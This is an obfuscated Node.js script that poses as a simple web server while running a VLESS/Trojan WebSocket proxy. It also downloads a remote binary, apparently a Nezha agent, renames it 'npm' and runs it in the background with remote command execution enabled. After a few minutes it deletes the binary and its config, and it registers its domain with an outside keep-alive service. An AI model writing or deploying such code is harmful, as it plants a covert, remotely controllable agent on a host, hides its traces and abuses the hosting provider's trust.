const _0x522a8f=_0x57f9;(function(_0xcaeaf2,_0x519247){const _0x50a1e1=_0x57f9,_0xeda805=_0xcaeaf2();while(!![]){try{const _0x2cb640=parseInt(_0x50a1e1(0x176))/0x1*(-parseInt(_0x50a1e1(0x174))/0x2)+parseInt(_0x50a1e1(0x15a))/0x3+-parseInt(_0x50a1e1(0x173))/0x4*(parseInt(_0x50a1e1(0x135))/0x5)+-parseInt(_0x50a1e1(0x107))/0x6*(-parseInt(_0x50a1e1(0x143))/0x7)+parseInt(_0x50a1e1(0x14a))/0x8+-parseInt(_0x50a1e1(0x178))/0x9+-parseInt(_0x50a1e1(0x13f))/0xa;if(_0x2cb640===_0x519247)break;else _0xeda805['push'](_0xeda805['shift']());}catch(_0x2f72d6){_0xeda805['push'](_0xeda805['shift']());}}}(_0x48ec,0x5facf));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x522a8f(0x11f)),net=require(_0x522a8f(0x136)),path=require('path'),crypto=require(_0x522a8f(0x133)),{Buffer}=require(_0x522a8f(0x104)),{exec,execSync}=require(_0x522a8f(0x168)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||_0x522a8f(0x10a),NEZHA_SERVER=process[_0x522a8f(0x159)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x522a8f(0x159)][_0x522a8f(0x164)]||'',NEZHA_KEY=process[_0x522a8f(0x159)][_0x522a8f(0x111)]||'',DOMAIN=process[_0x522a8f(0x159)][_0x522a8f(0x131)]||'1234.abc.com',AUTO_ACCESS=process[_0x522a8f(0x159)][_0x522a8f(0x12c)]||!![],WSPATH=process[_0x522a8f(0x159)][_0x522a8f(0x112)]||UUID['slice'](0x0,0x8),SUB_PATH=process['env'][_0x522a8f(0x119)]||'channel',NAME=process[_0x522a8f(0x159)][_0x522a8f(0x132)]||_0x522a8f(0x175),PORT=process['env'][_0x522a8f(0x14b)]||0x1eb4;let ISP='';function _0x48ec(){const _0x31f49a=['application/json','7810310IzjYiH','from','vless://','npm','7BmXIpx','substr','includes','get','npm\x20download\x20successfully','length','setsid\x20nohup\x20./npm\x20-s\x20','5268920DDLUsh','PORT','&fp=chrome&type=ws&host=','readUInt8','true','https://dns.google/resolve?name=','hex','false','find','2087','Failed\x20to\x20resolve\x20','stream','utf8','index.html','catch','env','1972314CdKGEy','8.8.4.4','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','application/dns-json','npm\x20is\x20already\x20running,\x20skip\x20running...','Unknown','writeHead','1.1.1.1','trojan://','reduce','NEZHA_PORT','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','arm','child_process','post','map','Not\x20Found\x0a','error:\x20','readUInt16BE','test','pipe','&type=A','close','\x20with\x20all\x20DNS\x20servers','433416mRYCbq','343934dCHXIt','Hug','2FAIVgQ','https://arm64.ssss.nyc.mn/v1','2389734XZrnGG','text/plain','\x20-p\x20','buffer','base64','Status','4098198kSEvee','utf-8','connection','ba6f74b5-73a1-4ff0-a417-917384c75672','join','unlink','Answer','https://speed.cloudflare.com/meta','url','then','NEZHA_KEY','WSPATH','createHash','digest','config.yaml','error','text/html','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','SUB_PATH',':443?encryption=none&security=tls&sni=','end','https://oooo.serv00.net/add-url','write','&path=%2F','axios','sha224','client_secret:\x20','log','Hello\x20world!','country',':443?security=tls&sni=','finish','arch','type','https://amd64.ssss.nyc.mn/v1','/bin/bash','concat','AUTO_ACCESS','data','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','createServer','listen','DOMAIN','NAME','crypto','connect','10oQYzUg','net','8443','every','443','asOrganization','replace','slice','toString'];_0x48ec=function(){return _0x31f49a;};return _0x48ec();}const GetISP=async()=>{const _0x36f38e=_0x522a8f;try{const _0x20fb15=await axios[_0x36f38e(0x146)](_0x36f38e(0x10e)),_0x114087=_0x20fb15[_0x36f38e(0x12d)];ISP=(_0x114087[_0x36f38e(0x124)]+'-'+_0x114087[_0x36f38e(0x13a)])[_0x36f38e(0x13b)](/ /g,'_');}catch(_0x2cffbf){ISP=_0x36f38e(0x15f);}};GetISP();const httpServer=http[_0x522a8f(0x12f)]((_0x4fb208,_0x361541)=>{const _0x5e93bd=_0x522a8f;if(_0x4fb208['url']==='/'){const _0x340899=path['join'](__dirname,_0x5e93bd(0x157));fs['readFile'](_0x340899,_0x5e93bd(0x156),(_0x27c4c2,_0x169b61)=>{const _0x428a9a=_0x5e93bd;if(_0x27c4c2){_0x361541[_0x428a9a(0x160)](0xc8,{'Content-Type':_0x428a9a(0x117)}),_0x361541[_0x428a9a(0x11b)](_0x428a9a(0x123));return;}_0x361541['writeHead'](0xc8,{'Content-Type':_0x428a9a(0x117)}),_0x361541[_0x428a9a(0x11b)](_0x169b61);});return;}else{if(_0x4fb208['url']==='/'+SUB_PATH){const _0x3f7746=_0x5e93bd(0x141)+UUID+'@'+DOMAIN+_0x5e93bd(0x11a)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x5e93bd(0x11e)+WSPATH+'#'+NAME+'-'+ISP,_0x581b64=_0x5e93bd(0x162)+UUID+'@'+DOMAIN+_0x5e93bd(0x125)+DOMAIN+_0x5e93bd(0x14c)+DOMAIN+_0x5e93bd(0x11e)+WSPATH+'#'+NAME+'-'+ISP,_0x1f36f6=_0x3f7746+'\x0a'+_0x581b64,_0x52873a=Buffer[_0x5e93bd(0x140)](_0x1f36f6)[_0x5e93bd(0x13d)](_0x5e93bd(0x105));_0x361541[_0x5e93bd(0x160)](0xc8,{'Content-Type':'text/plain'}),_0x361541['end'](_0x52873a+'\x0a');}else _0x361541['writeHead'](0x194,{'Content-Type':_0x5e93bd(0x102)}),_0x361541[_0x5e93bd(0x11b)](_0x5e93bd(0x16b));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x522a8f(0x13b)](/-/g,''),DNS_SERVERS=[_0x522a8f(0x15b),_0x522a8f(0x161)];function resolveHost(_0x38a6ea){return new Promise((_0x12bfd7,_0x3472f9)=>{const _0x5eafcf=_0x57f9;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x5eafcf(0x16e)](_0x38a6ea)){_0x12bfd7(_0x38a6ea);return;}let _0x4c10ed=0x0;function _0x3cb467(){const _0x4125b5=_0x5eafcf;if(_0x4c10ed>=DNS_SERVERS[_0x4125b5(0x148)]){_0x3472f9(new Error(_0x4125b5(0x154)+_0x38a6ea+_0x4125b5(0x172)));return;}const _0x2bb40a=DNS_SERVERS[_0x4c10ed];_0x4c10ed++;const _0x5bf260=_0x4125b5(0x14f)+encodeURIComponent(_0x38a6ea)+_0x4125b5(0x170);axios[_0x4125b5(0x146)](_0x5bf260,{'timeout':0x1388,'headers':{'Accept':_0x4125b5(0x15d)}})[_0x4125b5(0x110)](_0x4d90=>{const _0x3fb339=_0x4125b5,_0x41771d=_0x4d90[_0x3fb339(0x12d)];if(_0x41771d[_0x3fb339(0x106)]===0x0&&_0x41771d[_0x3fb339(0x10d)]&&_0x41771d[_0x3fb339(0x10d)][_0x3fb339(0x148)]>0x0){const _0x1de8fd=_0x41771d[_0x3fb339(0x10d)][_0x3fb339(0x152)](_0x435b2c=>_0x435b2c[_0x3fb339(0x128)]===0x1);if(_0x1de8fd){_0x12bfd7(_0x1de8fd[_0x3fb339(0x12d)]);return;}}_0x3cb467();})['catch'](_0x5d703b=>{_0x3cb467();});}_0x3cb467();});}function handleVlessConnection(_0x1bf78a,_0x5d72b2){const _0xd3e426=_0x522a8f,[_0x424c11]=_0x5d72b2,_0x19cd00=_0x5d72b2['slice'](0x1,0x11);if(!_0x19cd00[_0xd3e426(0x138)]((_0x593632,_0x18a7e4)=>_0x593632==parseInt(uuid[_0xd3e426(0x144)](_0x18a7e4*0x2,0x2),0x10)))return![];let _0x5891b4=_0x5d72b2['slice'](0x11,0x12)[_0xd3e426(0x14d)]()+0x13;const _0x1b8ef3=_0x5d72b2['slice'](_0x5891b4,_0x5891b4+=0x2)[_0xd3e426(0x16d)](0x0),_0x1f5243=_0x5d72b2[_0xd3e426(0x13c)](_0x5891b4,_0x5891b4+=0x1)['readUInt8'](),_0x49aa50=_0x1f5243==0x1?_0x5d72b2[_0xd3e426(0x13c)](_0x5891b4,_0x5891b4+=0x4)[_0xd3e426(0x10b)]('.'):_0x1f5243==0x2?new TextDecoder()['decode'](_0x5d72b2[_0xd3e426(0x13c)](_0x5891b4+0x1,_0x5891b4+=0x1+_0x5d72b2[_0xd3e426(0x13c)](_0x5891b4,_0x5891b4+0x1)[_0xd3e426(0x14d)]())):_0x1f5243==0x3?_0x5d72b2['slice'](_0x5891b4,_0x5891b4+=0x10)['reduce']((_0x5758a3,_0x44790a,_0x5bb1ba,_0x2ce37f)=>_0x5bb1ba%0x2?_0x5758a3[_0xd3e426(0x12b)](_0x2ce37f[_0xd3e426(0x13c)](_0x5bb1ba-0x1,_0x5bb1ba+0x1)):_0x5758a3,[])[_0xd3e426(0x16a)](_0x564c1e=>_0x564c1e[_0xd3e426(0x16d)](0x0)[_0xd3e426(0x13d)](0x10))['join'](':'):'';_0x1bf78a['send'](new Uint8Array([_0x424c11,0x0]));const _0x2ed553=createWebSocketStream(_0x1bf78a);return resolveHost(_0x49aa50)[_0xd3e426(0x110)](_0x3455de=>{const _0x268265=_0xd3e426;net[_0x268265(0x134)]({'host':_0x3455de,'port':_0x1b8ef3},function(){const _0x361327=_0x268265;this[_0x361327(0x11d)](_0x5d72b2[_0x361327(0x13c)](_0x5891b4)),_0x2ed553['on'](_0x361327(0x116),()=>{})[_0x361327(0x16f)](this)['on'](_0x361327(0x116),()=>{})[_0x361327(0x16f)](_0x2ed553);})['on'](_0x268265(0x116),()=>{});})['catch'](_0x2da252=>{const _0x2961b5=_0xd3e426;net[_0x2961b5(0x134)]({'host':_0x49aa50,'port':_0x1b8ef3},function(){const _0x2af99e=_0x2961b5;this['write'](_0x5d72b2[_0x2af99e(0x13c)](_0x5891b4)),_0x2ed553['on'](_0x2af99e(0x116),()=>{})[_0x2af99e(0x16f)](this)['on']('error',()=>{})[_0x2af99e(0x16f)](_0x2ed553);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x42d444,_0x538c2b){const _0xec0981=_0x522a8f;try{if(_0x538c2b['length']<0x3a)return![];const _0x6412de=_0x538c2b[_0xec0981(0x13c)](0x0,0x38)[_0xec0981(0x13d)](),_0x35a746=[UUID];let _0x8c8fd7=null;for(const _0x5b8b0a of _0x35a746){const _0x16e276=crypto[_0xec0981(0x113)](_0xec0981(0x120))['update'](_0x5b8b0a)[_0xec0981(0x114)](_0xec0981(0x150));if(_0x16e276===_0x6412de){_0x8c8fd7=_0x5b8b0a;break;}}if(!_0x8c8fd7)return![];let _0x379610=0x38;_0x538c2b[_0x379610]===0xd&&_0x538c2b[_0x379610+0x1]===0xa&&(_0x379610+=0x2);const _0x30d9de=_0x538c2b[_0x379610];if(_0x30d9de!==0x1)return![];_0x379610+=0x1;const _0x1575a1=_0x538c2b[_0x379610];_0x379610+=0x1;let _0x5db26a,_0x515809;if(_0x1575a1===0x1)_0x5db26a=_0x538c2b['slice'](_0x379610,_0x379610+0x4)['join']('.'),_0x379610+=0x4;else{if(_0x1575a1===0x3){const _0x55e48d=_0x538c2b[_0x379610];_0x379610+=0x1,_0x5db26a=_0x538c2b['slice'](_0x379610,_0x379610+_0x55e48d)[_0xec0981(0x13d)](),_0x379610+=_0x55e48d;}else{if(_0x1575a1===0x4)_0x5db26a=_0x538c2b['slice'](_0x379610,_0x379610+0x10)[_0xec0981(0x163)]((_0x3f7690,_0x51ee93,_0xa2df22,_0x2954f9)=>_0xa2df22%0x2?_0x3f7690['concat'](_0x2954f9[_0xec0981(0x13c)](_0xa2df22-0x1,_0xa2df22+0x1)):_0x3f7690,[])['map'](_0x1d263c=>_0x1d263c[_0xec0981(0x16d)](0x0)['toString'](0x10))[_0xec0981(0x10b)](':'),_0x379610+=0x10;else return![];}}_0x515809=_0x538c2b['readUInt16BE'](_0x379610),_0x379610+=0x2;_0x379610<_0x538c2b[_0xec0981(0x148)]&&_0x538c2b[_0x379610]===0xd&&_0x538c2b[_0x379610+0x1]===0xa&&(_0x379610+=0x2);const _0x139c3d=createWebSocketStream(_0x42d444);return resolveHost(_0x5db26a)[_0xec0981(0x110)](_0x244787=>{const _0x36a40b=_0xec0981;net[_0x36a40b(0x134)]({'host':_0x244787,'port':_0x515809},function(){const _0x47b48a=_0x36a40b;_0x379610<_0x538c2b[_0x47b48a(0x148)]&&this[_0x47b48a(0x11d)](_0x538c2b[_0x47b48a(0x13c)](_0x379610)),_0x139c3d['on'](_0x47b48a(0x116),()=>{})[_0x47b48a(0x16f)](this)['on'](_0x47b48a(0x116),()=>{})['pipe'](_0x139c3d);})['on'](_0x36a40b(0x116),()=>{});})[_0xec0981(0x158)](_0x425776=>{const _0x3d39af=_0xec0981;net['connect']({'host':_0x5db26a,'port':_0x515809},function(){const _0x8ccdae=_0x57f9;_0x379610<_0x538c2b['length']&&this['write'](_0x538c2b['slice'](_0x379610)),_0x139c3d['on'](_0x8ccdae(0x116),()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0x139c3d);})['on'](_0x3d39af(0x116),()=>{});}),!![];}catch(_0x2cc549){return![];}}wss['on'](_0x522a8f(0x109),(_0x282a33,_0x4f8a7b)=>{const _0x313471=_0x522a8f,_0x352e10=_0x4f8a7b[_0x313471(0x10f)]||'';_0x282a33['once']('message',_0x3b158c=>{const _0x3d80cd=_0x313471;if(_0x3b158c[_0x3d80cd(0x148)]>0x11&&_0x3b158c[0x0]===0x0){const _0x3b2dfa=_0x3b158c['slice'](0x1,0x11),_0x5a3ae4=_0x3b2dfa[_0x3d80cd(0x138)]((_0x5acc8d,_0x1dbfbd)=>_0x5acc8d==parseInt(uuid[_0x3d80cd(0x144)](_0x1dbfbd*0x2,0x2),0x10));if(_0x5a3ae4){!handleVlessConnection(_0x282a33,_0x3b158c)&&_0x282a33[_0x3d80cd(0x171)]();return;}}!handleTrojanConnection(_0x282a33,_0x3b158c)&&_0x282a33[_0x3d80cd(0x171)]();})['on'](_0x313471(0x116),()=>{});});function _0x57f9(_0x8f9a50,_0x3fa6e4){const _0x48ec47=_0x48ec();return _0x57f9=function(_0x57f98c,_0x89bdf2){_0x57f98c=_0x57f98c-0x102;let _0x4cf740=_0x48ec47[_0x57f98c];return _0x4cf740;},_0x57f9(_0x8f9a50,_0x3fa6e4);}const getDownloadUrl=()=>{const _0x293f1e=_0x522a8f,_0x46b047=os[_0x293f1e(0x127)]();return _0x46b047===_0x293f1e(0x167)||_0x46b047==='arm64'||_0x46b047==='aarch64'?!NEZHA_PORT?_0x293f1e(0x177):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x293f1e(0x129):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x1839dd=_0x522a8f;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3681eb=getDownloadUrl(),_0x499553=await axios({'method':_0x1839dd(0x146),'url':_0x3681eb,'responseType':_0x1839dd(0x155)}),_0x49fc53=fs['createWriteStream']('npm');return _0x499553[_0x1839dd(0x12d)][_0x1839dd(0x16f)](_0x49fc53),new Promise((_0x1be0cd,_0x400409)=>{const _0x1d3247=_0x1839dd;_0x49fc53['on'](_0x1d3247(0x126),()=>{const _0x55ca06=_0x1d3247;console[_0x55ca06(0x122)](_0x55ca06(0x147)),exec('chmod\x20+x\x20npm',_0x79ee08=>{if(_0x79ee08)_0x400409(_0x79ee08);_0x1be0cd();});}),_0x49fc53['on'](_0x1d3247(0x116),_0x400409);});}catch(_0x236c07){throw _0x236c07;}},runnz=async()=>{const _0x10e52b=_0x522a8f;try{const _0x4dbac9=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x10e52b(0x108)});if(_0x4dbac9['trim']()!==''){console['log'](_0x10e52b(0x15e));return;}}catch(_0x4d64e0){}await downloadFile();let _0x10ffae='',_0x46d4b8=[_0x10e52b(0x139),_0x10e52b(0x137),'2096',_0x10e52b(0x153),'2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x46520d=_0x46d4b8[_0x10e52b(0x145)](NEZHA_PORT)?'--tls':'';_0x10ffae=_0x10e52b(0x149)+NEZHA_SERVER+':'+NEZHA_PORT+_0x10e52b(0x103)+NEZHA_KEY+'\x20'+_0x46520d+_0x10e52b(0x118);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xf72a5e=NEZHA_SERVER[_0x10e52b(0x145)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x27b1a9=_0x46d4b8[_0x10e52b(0x145)](_0xf72a5e)?_0x10e52b(0x14e):_0x10e52b(0x151),_0x21d06c=_0x10e52b(0x121)+NEZHA_KEY+_0x10e52b(0x15c)+NEZHA_SERVER+_0x10e52b(0x12e)+_0x27b1a9+_0x10e52b(0x166)+UUID;fs['writeFileSync']('config.yaml',_0x21d06c);}_0x10ffae=_0x10e52b(0x165);}else{console[_0x10e52b(0x122)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x10ffae,{'shell':_0x10e52b(0x12a)},_0x16dc91=>{const _0x265259=_0x10e52b;if(_0x16dc91)console[_0x265259(0x116)]('npm\x20running\x20error:',_0x16dc91);else console[_0x265259(0x122)]('npm\x20is\x20running');});}catch(_0xd34ce0){console[_0x10e52b(0x116)](_0x10e52b(0x16c)+_0xd34ce0);}};async function addAccessTask(){const _0x5b01ea=_0x522a8f;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x1c989a='https://'+DOMAIN;try{const _0x5b2392=await axios[_0x5b01ea(0x169)](_0x5b01ea(0x11c),{'url':_0x1c989a},{'headers':{'Content-Type':_0x5b01ea(0x13e)}});console[_0x5b01ea(0x122)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x38c04d){}}const delFiles=()=>{const _0xdda95f=_0x522a8f;fs[_0xdda95f(0x10c)](_0xdda95f(0x142),()=>{}),fs[_0xdda95f(0x10c)](_0xdda95f(0x115),()=>{});};httpServer[_0x522a8f(0x130)](PORT,()=>{runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
